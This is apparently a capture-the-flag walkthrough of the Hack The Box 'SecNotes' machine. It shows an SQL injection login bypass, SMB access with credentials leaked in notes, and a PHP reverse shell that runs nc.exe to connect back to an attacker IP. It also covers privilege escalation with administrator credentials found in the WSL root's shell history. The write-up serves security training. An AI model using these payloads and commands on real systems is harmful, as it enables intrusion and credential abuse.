## About

SecNotes is a medium difficulty machine, which highlights the risks associated with weak password change mechanisms, lack of CSRF protection, and insufficient validation of user input. It also teaches about Windows Subsystem for Linux enumeration.

---

## Initial Enumeration

### Nmap Scan

I started with an Nmap scan to identify open ports and services running on the target.

`nmap -A -T4 -p- 10.129.183.208`

The scan results showed:
```
80/tcp   open  http
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0

Host script results:
|_clock-skew: mean: 2h20m00s, deviation: 4h02m31s, median: -1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-03-16T14:53:14
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2025-03-16T07:53:13-07:00
```

- Port 80: A notes website where you can create an account and log in.
- Port 445: SMB service, with potential for further post-compromise activity.
- Port 8808: A basic IIS page.

---

### Web Application Enumeration

- **Port 80 (Web Application)**: The website appeared to be a note-taking app where users can create accounts and log in.
    
    ![](Images/Pasted%20image%2020250316105816.png)
    
- **Port 8808 (IIS Web Server)**: This was a basic IIS page.
    
    ![](Images/Pasted%20image%2020250316105638.png)
    

Based on the description of the box, it seemed like we needed to find an XSS or SQL Injection vulnerability to access the stored notes.

---

## Exploitation

### Step 1: Intercept and Configure Payloads

I used Burp Suite to intercept the registration request and configured a series of SQL injection payloads to test for potential vulnerabilities.

![](Images/Pasted%20image%2020250316110829.png)

---

### Step 2: Run Payloads

I ran the payloads against the registration request using Burp Suite's Intruder.

![](Images/Pasted%20image%2020250316111342.png)

After creating several accounts with SQL injection payloads, I attempted to log in using some of those payloads.

---

### Step 3: Login with SQL Injection

After testing a variety of payloads, I found that the following SQL injection successfully logged in:

`'OR 1 OR'`

This allowed me to bypass the login mechanism and authenticate successfully.

![](Images/Pasted%20image%2020250316111923.png)

Based on this authentication working I could assume on the backend to login SQL Query would look something like this `SELECT * FROM users WHERE username = 'input_username' AND password = 'input_password';`

Once I am in the host, I will see if I can enumerate the actual logon script to further understand why this Injection worked and returned all notes from the Database.

**Post Exploitation Evaluation**

1. **In `login.php`:** The query in `login.php` is:
    
    `$sql = "SELECT username, password FROM users WHERE username = ?";`
    
    With the injected payload (`' OR 1 OR '`), the query becomes:
    
    `SELECT username, password FROM users WHERE username = '' OR 1;`
    
    - The `''` (empty string) causes no filtering on the `username`.
    - The `OR 1` always evaluates to `true`, effectively bypassing the authentication check.
    - As a result, the query returns all users in the table, granting unauthorized access.
2. **In `home.php`:** The query in `home.php` is:

    `$sql = "SELECT id, title, note, created_at FROM posts WHERE username = '" . $username . "'";`
    
    Injecting the same payload for `username` (`' OR 1 OR '`) causes the query to become:

    `SELECT id, title, note, created_at FROM posts WHERE username = '' OR 1;`
    
    - The condition `'' OR 1` (where `1` is always true) makes the query return all the records in the `posts` table, regardless of the original username.
    - The `OR 1` bypasses the intended filtering and returns all notes in the database.

---

### Step 4: Enumeration

Once logged in, I enumerated the notes and discovered a username and password in cleartext that led to an SMB share:

![](Images/Pasted%20image%2020250316112438.png)

`\\secnotes.htb\new-site tyler / 92g!mA8BGjOirkL%OG*&`

---

### Step 5: Authentication via SMB

I attempted to use SMB to authenticate with the credentials provided in the note.

After attempting to use `smbexec` and `psexec` tools, I switched to `smbclient` for a successful login.

`smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' \\\\secnotes.htb\\new-site`

![](Images/Pasted%20image%2020250316112926.png)

---

### Step 6: Popping a Shell

At this point, we had SMB access. I used a simple reverse shell payload to attempt to gain command execution.

1. **Uploading Netcat**: First, I uploaded `nc.exe`.
    
    ![](Images/Pasted%20image%2020250316113905.png)
    
2. **PHP Reverse Shell Script**: I created a PHP reverse shell to call `nc.exe` and connect back to my machine.
    

```
<?php
// Command to execute nc.exe to connect back to 10.10.14.13 on port 9090
$command = 'nc.exe -e cmd.exe 10.10.14.13 9090';

// Execute the command
system($command);
?>
```

I uploaded this PHP script, which connected back to my netcat listener.

---

We successfully established a shell as the user `tyler`.

![](Images/Pasted%20image%2020250316114604.png)

We can quickly grab the user flag.
![](Images/Pasted%20image%2020250316115059.png)

---

## Post Exploitation

### WSL Enumeration

The machine runs Windows Subsystem for Linux (WSL), which is a potential avenue for privilege escalation.

![](Images/Pasted%20image%2020250316115419.png)


Using `wsl.exe`, I found the subsystem was running as root.

![](Images/Pasted%20image%2020250316115516.png)

I also confirmed this by using the bash executable.

![](Images/Pasted%20image%2020250316115615.png)

---

### Step 1: TTY Shell

Before proceeding, I spawned a basic TTY shell using Python for better interactivity.

`python -c 'import pty; pty.spawn("/bin/bash")'`

![](Images/Pasted%20image%2020250316120127.png)

---

### Step 2: Root History Enumeration

While exploring the root user's history, I found credentials stored for SMB access:
![](Images/Pasted%20image%2020250316120409.png)
`smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$`

This appeared to be the administrator credentials we were looking for.

---

### Privilege Escalation

I used the administrator credentials with `smbexec.py` to gain administrator-level access.

`smbexec.py administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.129.183.208`

![](Images/Pasted%20image%2020250316120617.png)

The credentials were valid, and I gained full control over the system.

---

### Step 3: Retrieving the Root Flag

Finally, I used `smbclient` to navigate to the desktop and retrieve the root flag.

`smbclient -U administrator \\\\127.0.0.1\\c$`

![](Images/Pasted%20image%2020250316121157.png)

![](Images/Pasted%20image%2020250316121207.png)
